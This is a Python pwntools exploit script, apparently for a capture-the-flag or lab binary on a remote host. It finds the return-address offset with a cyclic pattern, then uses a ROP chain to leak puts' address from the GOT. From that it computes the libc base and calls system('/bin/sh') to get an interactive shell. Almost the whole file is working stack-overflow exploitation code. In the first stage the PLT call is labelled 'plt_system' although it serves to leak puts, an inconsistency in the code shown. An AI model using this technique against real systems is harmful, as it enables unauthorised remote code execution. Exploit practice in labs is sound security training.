import os

from pwn import process
from pwn import remote
from pwn import gdb
from pwn import context
from pwn import ELF
from pwn import ROP
from pwn import pprint
from pwn import asm
from pwn import shellcraft
from pwn import args
from pwn import info
from pwn import cyclic
from pwn import cyclic_find
from pwn import p64
from pwn import u64
from pwn import log


HOST = '10.129.7.70'
PORT = 1337


def start(argv=[], *a, **kw):
    """Switch between local/GDB/remote """
    if args.GDB:
        return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(HOST, PORT, *a, **kw)
    else:
        return process([binary] + argv, *a, **kw)


def get_ip_location(payload):
    """Locates the IP offset"""
    p = process(binary)
    p.sendlineafter('\n', payload)
    p.wait()
	#ip_offset = cyclic_find(p.corefile.pc) # x86
    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4)) # x64
    info('located EIP/RIP offset at {a}'.format(a=ip_offset))
    os.system('/usr/bin/rm core.*')
    return ip_offset


# Write a GDB script here for debugging
gdbscript = '''
continue
'''.format(**locals())


# Set up Pwntools 
binary = './myapp'
elf = context.binary = ELF(binary, checksec=False)
# Logging level (info/debug)
context.log_level = 'info'

#pprint(elf.symbols)

# ===============================================================
#			SHELLCODE GOES HERE
# ===============================================================

sh = shellcraft.sh()

custom_shellcode = '''

'''% (locals())

shellcode = asm(sh)
#shellcode = asm(custom_shellcode)

# ===============================================================
#			ROPCHAINS GOES HERE
# ===============================================================

rop = ROP(elf)

print(rop.dump())
pprint(rop.gadgets)

# =============================================================
#			EXPLOIT GOES HERE
# =============================================================

exploit = start()

offset = get_ip_location(cyclic(200))

# Build the payload
padding = b'A' * offset
main = p64(0x40115f)
plt_system = p64(0x401040)
got_puts = p64(0x404018)
pop_rdi = p64(0x40120b)

payload = padding + pop_rdi + got_puts + plt_system + main

# Send the payload
exploit.sendlineafter(b'\n', payload)
leaked_puts = u64(exploit.recvline().strip()[7:-11].ljust(8,b"\x00"))
log.info("Leaked puts address: %x" % leaked_puts)
libc_base = leaked_puts - 0x68f90
log.info("libc_base: %x" % libc_base)

sh = p64(0x161c19 + libc_base)


payload = padding + pop_rdi + sh + plt_system
exploit.sendlineafter(b'\n', payload)
exploit.interactive()
